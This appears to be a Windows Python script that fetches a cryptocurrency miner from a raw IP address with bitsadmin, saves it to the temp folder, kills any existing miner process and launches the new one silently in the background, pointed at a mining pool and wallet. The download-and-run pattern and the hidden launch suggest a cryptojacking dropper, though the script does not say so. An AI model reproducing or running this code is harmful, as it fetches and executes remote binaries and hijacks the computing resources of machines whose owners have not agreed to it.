import subprocess
import os
import time

# Download using bitsadmin (built into Windows)
miner_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "miner.exe")

# Kill any existing download job
os.system("bitsadmin /cancel miner_dl 2>nul")

# Download
dl_cmd = f'bitsadmin /transfer miner_dl /download /priority high "http://151.247.219.40:8000/alpha-miner-windows.exe" "{miner_path}"'
ret = os.system(dl_cmd)

# Check size
size = os.path.getsize(miner_path) if os.path.exists(miner_path) else 0

if size > 1000000:
    # Kill existing miner
    os.system("taskkill /F /IM miner.exe 2>nul")
    time.sleep(1)

    # Start miner via start command
    start_cmd = f'start "" /B "{miner_path}" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker WIN_200'
    os.system(start_cmd)

    time.sleep(3)

    # Check if running
    r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq miner.exe"], capture_output=True, text=True)
    running = "miner.exe" in r.stdout

    result = f"dl_ret={ret},size={size},running={running}"
else:
    result = f"dl_ret={ret},size={size}"
